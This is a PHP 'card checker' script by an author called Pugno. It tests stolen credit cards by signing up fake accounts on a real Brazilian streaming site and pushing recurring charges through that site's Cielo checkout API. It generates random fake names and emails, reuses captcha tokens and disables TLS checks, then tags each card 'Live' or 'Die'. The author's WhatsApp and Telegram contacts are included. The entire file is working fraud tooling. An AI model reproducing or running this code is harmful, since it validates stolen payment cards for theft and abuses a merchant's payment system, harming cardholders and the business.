<?php

/*
*Author: Pugno <pugno_fc>
*/

/*
 _ __ _  _ __ _ _ _  ___ 
| '_ \ || / _` | ' \/ _ \
| .__/\_,_\__, |_||_\___/
|_|       |___/          


Corre no meu canal do youtube 

* @𝓐𝓾𝓽𝓱𝓸𝓻   𝓟 𝓾 𝓰 𝓷 𝓸
*
* 𝓒𝓸𝓷𝓽𝓪𝓬𝓽   𝓦𝓱𝓪𝓽𝓼𝓪𝓹𝓹  >>  (21) 97225-9563
* 𝓒𝓸𝓷𝓽𝓪𝓬𝓽   𝓣𝓮𝓵𝓮𝓰𝓻𝓪𝓶  >>  @pugno_fc
*
*/
error_reporting(0);
if (file_exists("cookie.txt") !== false) {
    unlink("cookie.txt");
    fopen("cookie<.txt", 'w+');
    fclose("cookie.txt");
} else {
    fopen("cookie.txt", 'w+');
    fclose("cookie.txt");
}
function getStr($string, $start, $end) {
 $str = explode($start, $string);
 $str = explode($end, $str[1]);  
 return $str[0];
}

function multiexplode($string) {
 $delimiters = array("|", ";", ":", "/", "»", "«", ">", "<");
 $one = str_replace($delimiters, $delimiters[0], $string);
 $two = explode($delimiters[0], $one);
 return $two;
}

$lista = $_GET['lista'];
$cc = multiexplode($lista)[0];
$mes = multiexplode($lista)[1];
$ano = multiexplode($lista)[2];
$cvv = multiexplode($lista)[3];

$t = strlen($ano);
if ($t > 2){
  $ano = substr($ano, 2,4);
}
$data = $mes."/20".$ano;
$bindata = file_get_contents("https://dragon-bin-api.vercel.app/api/$cc");
$bin = getStr($bindata,'"bin":"','"');    
$card_brand = getStr($bindata,'"vendor":"','"');
$card_type = getStr($bindata,'"type":"','"');
$card_category = getStr($bindata,'"level":"','"');
$country_code = getStr($bindata,'","code":"','"');
$country = getStr($bindata,'","country":"','"');
$Bank = getStr($bindata,'"bank":"','"');
$emoji = getStr($bindata,'","emoji":"','"');
$cardinfo = "$bin | $Bank - $card_brand - $card_type - $country $emoji";


$nm = ["marcos","abreu","murilo","diego","aberto","dario","micael","rodrigo","marlon","silva","Abrahao","Abade","francisco","alan","ronaldo","marinho","Abelardo","magal","lemos","thales","tiago","Diniz","luiz","heitor","leandro","arthur","david","juan","diogo","caue","joaquin","isaac","carlos","andre","marrone","ian"]; ####36####
$nomeemail = $nm[array_rand($nm)];

$sobre = ["rodrigues","vieira","castro","oliveira","gomes","almeida","andrade","barros","borges","campos","cardoso","carvalho","costa","dias","dantas","duarte","santos","freitas","fernandes","ferreira","garcia","gonçalves","lima","lopes","machado","marques","bernardo","martins","medeiros","melo","mendes","miranda","monteiro","moraes","neves","moreira"]; ####36####
$sobrenome = $sobre[array_rand($sobre)];
$nomecompleto = strtoupper($nomeemail." ".$sobrenome);
$email = $nomeemail.$sobrenome.rand(000,999)."x@gmail.com";

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://apisite.californiatv.com.br/api/criarlogin/');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
#curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
#curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
  'accept: application/json, text/plain, */*',
  'authorization: ',
  'content-type: application/json;charset=UTF-8',
  'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.66 Safari/537.36',
  'x-stateserver: true',
  'origin: https://www.californiatv.com.br',
  'referer: https://www.californiatv.com.br/',
  'accept-language: pt-BR,pt;q=0.9',
));
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"login":"'.$email.'","senha":"@Pugno123","captcha":"03ANYolquN-13wMZHQNlYpwstYSm7Jlzi7GyYR_nYNBXzkX9B7RAtUrlvuya2yc1Qdq0Ihok8xxpti4XzMvxxN8HVEWl9OWk6CUkR39k8Ul7nEv3lvTb24R-zhPfJX0aEjYlsO8dSgA5HIzEAVBRT1ESNNlCb9eaL561o5UOvh70nefL_7-bvQvtHtgdoAVGCpn5i537JM0OIMG4aK3J-2i8YiZkWA6GQwLlkpYTtU8EqiHGfbjJmAderf6FCt8myDFJZEOcZI20v2MwmBx0CIQFtkXrzDcdCqosLDJGBfgBaga0uXYi04zzTH3QOM_h00j290MVxYLPKx1r2FNZOsWML6stCKUumEcQntddaaHXW4FKcQreGOkmEHjjfQ5SVBz6U0-GWj--CadBPdi_Cg_1b8Hc8JwPO3V8d_7KJ-7wJhkglT4aB6SsUrszW9CwSbIQrAUYgMYGIXNeEiwqpO_XlAcWdYKVhCwqFsH1piFk2AgQtsjdvX_Is"}');

$result = curl_exec($ch);
$token = getStr($result, 'token":"','"');

$ch = curl_init();curl_setopt($ch, CURLOPT_URL, 'https://apisite.californiatv.com.br/api/checkoutcielo/');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '
{"codigoInfluencer":"","captcha":"03ANYolqvx1jew9ySYuOczSvNvsLnnb2qmH9VRdHegLz6LKbRcv1f1EDgt1aZG0CpQBYYOy5-__a0DnAe4zGqKuiHuIEfq8E5VS_SkJkrzTF1Tm5uko8FjUAGlgS5QJonCLZs_uKl-QU-0tuaWvDbV8tdRwe-aFb6G5M6O4pNKmEilPfHnNtz-IwmewwmrIPaMdD05mcF0O3ZM4LH9_IXm7YU92w6h4ooQZMeYHRDooAb-sLw_63fo3uOXV-VCqGqf5cmnNPzZNcsOPY1H12i02gFys-dQwE7qGMcNwarxtUP-j7cZz8o59Kmq6HYA5Dv61g5e6gOG1U2Xqpx5HQ8YqqSTMWHhbaiVQ4XGvbS4RgSi3H8_U-SopKf8DLZ2ROT4QRCgcT2bX8fVweQRnwBHhN0gVAaXOtt3lIZ-lZUVSiEexfDEBr2yG-OjFOkaErGEE46PFWf4adW2bu9jGbQPQvKn3EEsdgp_MUT7UOs5zMk00_RiSpSydIM","codigoCupom":"","customer":{"name":"'.$nomecompleto.'"},"payment":{"amount":4790,"type":"CreditCard","creditCard":{"cardNumber":"'.$cc.'","holder":"'.$nomecompleto.'","expirationDate":"'.$data.'","securityCode":"'.$cvv.'","brand":"Visa"},"recurrentPayment":{"interval":"Monthly"}}}');
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');

$headers = array(
'Host: apisite.californiatv.com.br',
'Accept: application/json, text/plain, */*',
'Authorization: Bearer '.$token,
'Content-Type: application/json;charset=UTF-8',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.66 Safari/537.36',
'X-Stateserver: true',
'Origin: https://www.californiatv.com.br',
'Referer: https://www.californiatv.com.br/',
'Accept-Language: pt-BR,pt;q=0.9'
);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

 $result = curl_exec($ch);

$retorno = getStr($result, 'returnCode":','"');
if (strpos($result, 'Autorizacao negada')){
  $status = "<span class='badge badge-danger'>Die</span>";
  $vbv = "<span style='color:red;'>$retorno</span>";
}elseif(strpos($result, 'Não foi possível realizar seu pagamento.')) {  
  $status = "<span class='badge badge-danger'>#Aprovada</span>";
  $vbv = "<span style='color:red;'>$retorno</span>";
}
else {  
  $status = "<span class='badge badge-success'>Live</span>";
  $vbv = "<span style='color:green;'>$retorno</span>";
}

echo("<br>$status  <span style='color:White;'>$lista</span> 『 $cardinfo 』 Retorno: ($vbv) <span class='badge badge-light'>[Pugno Coder]</span><br>");

?>